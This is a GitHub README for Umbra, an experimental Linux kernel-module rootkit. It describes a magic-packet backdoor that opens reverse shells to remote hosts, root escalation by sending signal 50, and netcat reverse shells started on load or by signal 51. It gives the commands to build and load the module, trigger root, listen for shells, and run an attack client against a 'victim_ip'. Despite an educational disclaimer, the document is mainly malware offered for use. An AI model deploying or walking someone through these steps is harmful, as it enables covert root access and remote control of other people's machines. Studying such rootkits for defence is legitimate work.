![GitHub release (latest by date including pre-releases)](https://img.shields.io/github/v/release/h3xduck/Umbra?include_prereleases)
![Maintainability](https://img.shields.io/static/v1?label=maintainability&message=B&color=green)
![GitHub code size in bytes](https://img.shields.io/github/languages/code-size/h3xduck/Umbra)
![GitHub last commit](https://img.shields.io/github/last-commit/h3xduck/Umbra)

# Umbra

Umbra (/ˈʌmbrə/) is an experimental LKM rootkit for kernels 4.x and 5.x (up to 5.7) which opens a network backdoor that spawns reverse shells to remote hosts and more.

The rootkit is still under development, although the features listed below are already fully operational.

![Backdoor in action](https://github.com/h3xduck/Umbra/blob/magic_packets/images/umbrabackdoor.gif)

Note: This rootkit has been developed and tested using kernel 5.4.0 and Ubuntu 18.04.

## Features
* **NEW**: Backdoor which spawns reverse shell to remote IP after receiving a malicious TCP packet.
* Privilege escalation by sending signal 50.
* Spawn netcat reverse shell on module load.
* Spawn netcat reverse shell to a remote host by sending signal 51.

More functionalities will come in later updates.

## Disclaimer
This rookit is **purely for educational purposes**. I am not responsible for any damage resulting from its unintended use.

Also bear in mind that Umbra does not incorporate any rootkit hiding or protection mechanisms yet.

**IMPORTANT:** If you are going to test this rootkit in your own machine, I *strongly recommend* to use a VM. 

## Build and install
Remember that you should have a 4.x or 5.x kernel available.
1. Download your kernel header files
```sh
apt install linux-headers-$(uname -r)
```
2.Configure your include path to cover the kernel header directory (usually under /usr/src). If you are using vscode, you can check ```.vscode/c_cpp_properties.json``` for an example on which directories to include.

3. Clone the project
```
git clone https://github.com/h3xduck/Umbra.git
cd Umbra
```
4. Build Umbra
```
make
```
5. Load Umbra in the kernel
```
sudo insmod ./umbra.ko
```

## Unloading Umbra
```
sudo rmmod umbra
```

## Usage
### Change current user privileges to root
* Send signal 50 to any PID.
```
kill -50 1
```

### Start reverse netcat shell to IP:PORT
* Set your desired IP and port in CONFIG.H before building the rootkit. By default 127.0.0.1:5888

* Start listening at the remote host.
```
nc -lvp 5888
```
* Send signal 51 to any PID. Umbra will catch it and start the shell.
```
kill -51 1
```
<img src="images/kill51screenshot.png" width = 800/>

Note: Umbra also tries to start the reverse shell on load.

### **NEW**: Spawn reverse shell via backdoor
Any host can get a reverse shell by sending a specially-crafted packet to a machine infected with Umbra. The backdoor will try to open the shell on IP:5888, where IP is the IP address of the attacking machine.

You can look at the code to know how to build your own packet, but I also provide a client which will do the job for you. You can download the client from [latest releases](https://github.com/h3xduck/Umbra/releases/), or you can build your own using my library [RawTCP](https://github.com/h3xduck/RawTCP_Lib).

The client is run as follows:

```
./client <attacker_ip> <victim_ip>
```
Where the attacker ip will be used by the backdoor to connect the reverse shell and the victim ip is the one of the machine infected with Umbra.







## References
The development of this rootkit involved a substantial amount of research about LKMs and rootkit techniques. The following is an incomplete list of the resources I used:
How to create LKMs:
* https://tldp.org/LDP/lkmpg/2.6/html/lkmpg.html

Linux syscall reference:
* https://syscalls64.paolostivanin.com/

Some rootkit references:
* https://xcellerator.github.io/posts/
* https://web.archive.org/web/20160620231623/http://big-daddy.fr/repository/Documentation/Hacking/Security/Malware/Rootkits/writing-rootkit.txt
* https://github.com/f0rb1dd3n/Reptile

## License
This project is licensed under the GPLv2 license. See [LICENSE](https://github.com/h3xduck/Umbra/blob/master/LICENSE)
